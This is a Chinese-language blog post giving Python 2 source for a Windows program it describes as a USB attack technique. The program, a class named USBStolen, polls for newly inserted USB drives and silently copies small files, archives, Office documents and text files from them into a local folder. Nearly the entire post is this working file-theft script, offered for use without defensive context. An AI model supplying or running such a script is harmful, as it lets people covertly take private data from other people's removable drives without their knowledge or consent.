---
title: USB 设备文件拷贝
date: 2017-10-24 17:23:20
tags:
- Python
categories: Python
description: 展示一种电脑主动监测插入的U盘并拷贝特定文件的技术
---
这部内容将展示一种电脑USB攻击的技术：监测插入的USB设备并拷贝特定的文件。
###  源码

```
# -*- coding: UTF-8 -*-
import ctypes
import os
import time
import shutil
import re

def getsize(filename):
    try:
        size = os.path.getsize(filename)  # 返回的是一个单位为byte的数值
    except Exception as err:
        print err
    size = size / 1024.0  #返回  MB 为单位
    return size

class USBStolen(object):
    def __init__(self):
        self.interval = 3 # 秒
        self.savedir = self.get_savedir()
        self.last_disksymbol = []
        self.current_disksymbol = []
        self.size = 50.0
        self.regex_filename = re.compile('(.*zip$)|(.*rar$)|(.*docx$)|(.*ppt$)|(.*xls$)|(.*txt)')


    def get_savedir(self):
        if not os.path.exists("results"):
            os.mkdir("results")

        return "results"

    def judge(self, filename):
        if getsize(filename) < self.size:
            return True
        if self.regex_filename.match(filename):
            return True
        create_time = time.ctime(os.path.getctime(filename))  # Wed Jun 06 10:55:53 2018
        return False

    def steal(self, usb_disk = "H:"+os.sep):
        if usb_disk == ("C:"+os.sep) or usb_disk == ("D:" + os.sep):
            return
        for root,dirs,files in os.walk(usb_disk, topdown=True):
            for name in files:
                filename = os.path.join(root, name)  #  很重要
                if self.judge(filename):
                    # print filename # 中文会影响显示但不影响拷贝
                    shutil.copy2(filename, self.savedir)

    def usbmonitor(self):
        print "[+]Be monitoring......"
        while True:
            self.current_disksymbol = []
            lpBuffer = ctypes.create_string_buffer(78)
            ctypes.windll.kernel32.GetLogicalDriveStringsA(ctypes.sizeof(lpBuffer), lpBuffer)
            vol = lpBuffer.raw.split('\x00')
            for disk_symbol in vol:
                if disk_symbol != "":
                    self.current_disksymbol.append(disk_symbol)
            if self.last_disksymbol == []:
                self.last_disksymbol = self.current_disksymbol
            else:
                print self.last_disksymbol
                print self.current_disksymbol
                if len(self.current_disksymbol) > len(self.last_disksymbol):
                    new_usbdisk = [i for i in self.current_disksymbol if i not in self.last_disksymbol]
                    self.last_disksymbol = self.current_disksymbol
                    for usb_disk in new_usbdisk:
                        print "[+]Find new usb disk : ", usb_disk
                        self.steal(usb_disk)
                else:
                    self.last_disksymbol = self.current_disksymbol
            time.sleep(self.interval)

USBStolen().usbmonitor()
```

参考来源：https://zhuanlan.zhihu.com/p/35256334